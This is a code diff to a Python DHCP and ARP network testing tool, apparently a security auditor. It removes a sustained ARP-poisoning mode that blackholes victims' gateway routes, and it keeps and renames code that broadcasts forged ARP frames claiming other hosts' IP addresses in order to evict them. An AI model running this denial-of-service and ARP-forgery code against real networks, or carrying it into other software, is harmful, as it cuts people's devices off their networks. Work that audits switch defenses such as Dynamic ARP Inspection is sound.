@@ -68,7 +68,7 @@ class DhcpEngine:
         self.offers = 0
         self.acks = 0
         self.naks = 0
-        self.garps = 0
+        self.arp_conflicts = 0
         self.releases = 0
         self.servers: dict[str, ServerInfo] = {}
         # control transactions (legitimate cycle from the real NIC MAC), pre and post run
@@ -102,10 +102,10 @@ class DhcpEngine:
         # MAC we've sent from, so foreign-DISCOVER observation (Phase 2) can tell "ours" from
         # "someone else's" without false positives.
         self._our_macs: set[str] = set()
-        # garp mode: who we are poisoning, the forged MACs we used, and who fought back
-        self._garp_targets: set[str] = set()
-        self._garp_bogus_macs: set[str] = set()
-        self._garp_defenders: set[str] = set()
+        # eviction (2.3): who we are ARP-conflicting, the forged MACs we used, and who defended
+        self._evict_targets: set[str] = set()
+        self._evict_bogus_macs: set[str] = set()
+        self._evict_defenders: set[str] = set()
         # windowed handshake pipeline (exhaust): bounded in-flight DISCOVER/REQUEST transactions
         # rather than an open-loop packet flood. xid -> {mac, sent_at, state}.
         self._window = cfg.window_initial
@@ -211,7 +211,6 @@ class DhcpEngine:
             Mode.SCAN: self._run_scan,
             Mode.ACTIVE_SCAN: self._run_active_scan,
             Mode.RELEASE_NEIGHBORS: self._run_release,
-            Mode.GARP_DOS: self._run_garp,
             Mode.RELEASE_PREVIOUS: self._run_release_previous,
         }
         runners[self.cfg.mode]()
@@ -224,7 +223,7 @@ class DhcpEngine:
             "leases": self.acks,
             "naks": self.naks,
             "releases": self.releases,
-            "garps": self.garps,
+            "arp_conflicts": self.arp_conflicts,
         }
 
     def _status_ticker(self) -> None:
@@ -335,7 +334,7 @@ class DhcpEngine:
             "offers": self.offers,
             "leases": self.acks,
             "naks": self.naks,
-            "garps": self.garps,
+            "arp_conflicts": self.arp_conflicts,
             "releases": self.releases,
             "servers": len(self.servers),
             "elapsed": round(time.time() - self._started, 1) if self._started else 0.0,
@@ -719,48 +718,6 @@ class DhcpEngine:
                 )
             )
 
-        if self.cfg.mode is Mode.GARP_DOS and self.garps > 0:
-            defended = sorted(self._garp_defenders)
-            if defended:
-                self._raise(
-                    Finding(
-                        id="ARP_FORGERIES_REACHED_TARGETS",
-                        title="Forged ARP frames reached targets, which defended their addresses",
-                        verdict=INFO,
-                        severity="medium",
-                        evidence={
-                            "frames_sent": self.garps,
-                            "targets": len(self._garp_targets),
-                            "defended": defended,
-                        },
-                        recommendation=(
-                            "Nothing dropped our forged ARP on the way in, so Dynamic ARP "
-                            "Inspection is not filtering this port. Hosts defending their own "
-                            "address does not mean their gateway entry survived — confirm on a "
-                            "target with 'arp -a' / 'ip neigh' whether the gateway MAC is wrong."
-                        ),
-                    )
-                )
-            else:
-                self._raise(
-                    Finding(
-                        id="ARP_FORGERIES_UNANSWERED",
-                        title="Forged ARP frames drew no response from any target",
-                        verdict=INCONCLUSIVE,
-                        severity="medium",
-                        evidence={
-                            "frames_sent": self.garps,
-                            "targets": len(self._garp_targets),
-                        },
-                        recommendation=(
-                            "Either the frames were filtered (Dynamic ARP Inspection / port "
-                            "security) or the targets simply accepted them silently — both look "
-                            "identical from here. Check DAI drop counters on the switch, and "
-                            "'arp -a' on a target, to tell them apart."
-                        ),
-                    )
-                )
-
         if self.naks > 0:
             self._raise(
                 Finding(
@@ -861,17 +818,21 @@ class DhcpEngine:
             [(n.mac, n.ip) for n in neighbors], server_ip, server_mac=server_mac
         )
 
-    def _do_garp(self, targets: list[Neighbor], gateway: str | None = None) -> int:
-        """One poisoning round over `targets`. Returns frames sent. Unit-testable.
+    def _do_garp(self, targets: list[Neighbor]) -> int:
+        """One ARP-conflict round over `targets`. Returns frames sent. Unit-testable.
 
-        Per target, up to three frames:
-          1. broadcast GARP *request*  claiming the victim's own IP  (announcement form)
-          2. broadcast GARP *reply*    claiming the victim's own IP  (unsolicited form)
-          3. unicast ARP reply to the victim putting the GATEWAY at an unused MAC
+        Per target, two frames:
+          1. broadcast ARP *request*  claiming the victim's own IP  (announcement form)
+          2. broadcast ARP *reply*    claiming the victim's own IP  (unsolicited form)
 
-        (3) is the one that actually costs the victim connectivity — (1) and (2) mostly trip
-        duplicate-address detection, which well-behaved hosts simply defend against. The MAC
-        used is always bogus, so the traffic is blackholed rather than intercepted.
+        Both trip duplicate-address detection on a well-behaved host; RFC 5227 has the host
+        defend once, then go quiet on a second conflict inside DEFEND_INTERVAL (10s) — which is
+        what repeated rounds from `_evict_worker()` (Phase 4) are for. The MAC used is always
+        bogus, so nothing is intercepted, only disputed.
+
+        (2.3) No longer takes a `gateway` parameter or sends a third unicast frame blackholing
+        the victim's default route via `build_arp_poison()` — that crossed from denial-of-
+        service into traffic-interception-adjacent territory and added nothing eviction needs.
         """
         from .netutils import random_mac
 
@@ -880,28 +841,17 @@ class DhcpEngine:
             if self._stop.is_set():
                 break
             bogus = random_mac()
-            self._garp_bogus_macs.add(bogus)
+            self._evict_bogus_macs.add(bogus)
             for op, label in ((packets.ARP_REQUEST, "request"), (packets.ARP_REPLY, "reply")):
                 pkt = packets.build_garp(n.ip, bogus, op=op)
                 if self._send(pkt, target_ip=n.ip):
                     sent += 1
-                    self.garps += 1
+                    self.arp_conflicts += 1
                     self._debug(
-                        f"GARP {label} (op={op}) broadcast: claiming {n.ip} is at {bogus} "
-                        f"(real owner {n.mac or '?'})"
+                        f"ARP conflict {label} (op={op}) broadcast: claiming {n.ip} is at "
+                        f"{bogus} (real owner {n.mac or '?'})"
                     )
-            if gateway and n.mac and n.ip != gateway:
-                gw_bogus = random_mac()
-                self._garp_bogus_macs.add(gw_bogus)
-                pkt = packets.build_arp_poison(gateway, gw_bogus, n.ip, n.mac)
-                if self._send(pkt, target_ip=n.ip):
-                    sent += 1
-                    self.garps += 1
-                    self._debug(
-                        f"ARP poison unicast -> {n.ip} ({n.mac}): gateway {gateway} is at "
-                        f"{gw_bogus} (blackhole; victim's default route cut)"
-                    )
-            self.bus.emit(ev.GarpSent(ip=n.ip))
+            self.bus.emit(ev.ArpConflictSent(ip=n.ip))
         return sent
 
     # ---------------------------------------------------------------- pool estimate / headroom
@@ -1412,7 +1362,7 @@ class DhcpEngine:
         self._debug(f"NAK xid=0x{pkt[BOOTP].xid:08x} from {server_id} opts=[{_opts_summary(pkt)}]")
 
     def _run_scan(self) -> None:
-        # read-only: sniff + fingerprint. No DHCP REQUEST/RELEASE, no GARP.
+        # read-only: sniff + fingerprint. No DHCP REQUEST/RELEASE, no ARP conflict.
         self._sniffer = DhcpSniffer(self.cfg.interface, self.cfg.ip_version, self._on_scan)
         self._sniffer.start()
 
@@ -1729,86 +1679,6 @@ class DhcpEngine:
                     ),
                 )
             )
-
-    def _run_garp(self) -> None:
-        # watch ARP while poisoning, so we can tell whether targets fight back
-        if not self.cfg.dry_run:
-            self._sniffer = DhcpSniffer(self.cfg.interface, self.cfg.ip_version, self._on_garp_arp)
-            self._sniffer.start()
-            self._debug(f"garp: ARP observer started on {self.cfg.interface}")
-        t = threading.Thread(target=self._garp_worker, daemon=True)
-        t.start()
-        self._threads.append(t)
-
-    def _on_garp_arp(self, pkt) -> None:
-        """Record targets that re-announce their own address — i.e. they saw our forgery.
-
-        A host defending its address (RFC 5227) proves our frame was delivered, which is the
-        one thing we can establish from this vantage point. It does NOT prove the poisoning
-        failed: hosts can defend and still have had their gateway entry overwritten.
-        """
-        from scapy.all import ARP, Ether
-
-        try:
-            if ARP not in pkt:
-                return
-            psrc, hwsrc = pkt[ARP].psrc, pkt[Ether].src if Ether in pkt else ""
-            if psrc in self._garp_targets and hwsrc and hwsrc not in self._garp_bogus_macs:
-                if psrc not in self._garp_defenders:
-                    self._garp_defenders.add(psrc)
-                    self._debug(
-                        f"garp: {psrc} defended its address (ARP op={pkt[ARP].op} from {hwsrc}) "
-                        f"— our frame reached it and the host answered"
-                    )
-        except Exception as exc:
-            self.bus.emit(ev.ErrorEvent(message=f"garp observer error: {exc!r}"))
-
-    def _garp_worker(self) -> None:
-        """Sustained poisoning: repeat rounds until stopped.
-
-        A single pass is why this used to look like it did nothing — hosts re-ARP within
-        seconds and the legitimate owner answers, so one frame per victim is undone almost
-        immediately. Re-poisoning on an interval is what keeps a forged mapping in place.
-        """
-        from .netutils import default_gateway
-
-        cidrs = self._sweep_cidrs()
-        self._debug(f"garp: discovering targets in {', '.join(cidrs) or '(no range)'}")
-        neighbors, _ = self._discover_neighbors(cidrs)
-        gateway = default_gateway(self.cfg.interface)
-        targets = [n for n in neighbors if n.ip != gateway]
-        self._garp_targets = {n.ip for n in targets}
-
-        self._debug(
-            f"garp: {len(neighbors)} host(s) found, {len(targets)} target(s) after excluding "
-            f"the gateway; gateway={gateway or 'unknown'}"
-        )
-        for n in targets:
-            fp = n.fingerprint
-            who = (fp.device or fp.vendor) if fp else None
-            self._debug(f"garp target: {n.ip} : {n.mac}" + (f"  [{who}]" if who else ""))
-        if not targets:
-            self._debug("garp: no targets — nothing to do")
-            self._finish_in_background("no garp targets")
-            return
-        if not gateway:
-            self._debug(
-                "garp: no default gateway found — sending announcements only. Without a gateway "
-                "to blackhole, hosts typically just defend their address and stay online."
-            )
-
-        rounds = 0
-        interval = self.cfg.timeouts.garp_interval
-        while not self._stop.is_set():
-            rounds += 1
-            sent = self._do_garp(targets, gateway=gateway)
-            self._debug(
-                f"garp round {rounds}: {sent} frame(s) over {len(targets)} target(s); "
-                f"{len(self._garp_defenders)} host(s) have defended so far; "
-                f"next round in {interval:g}s"
-            )
-            if self._stop.wait(interval):
-                break
 
     def _discover_neighbors(
         self, cidrs: list[str] | None = None
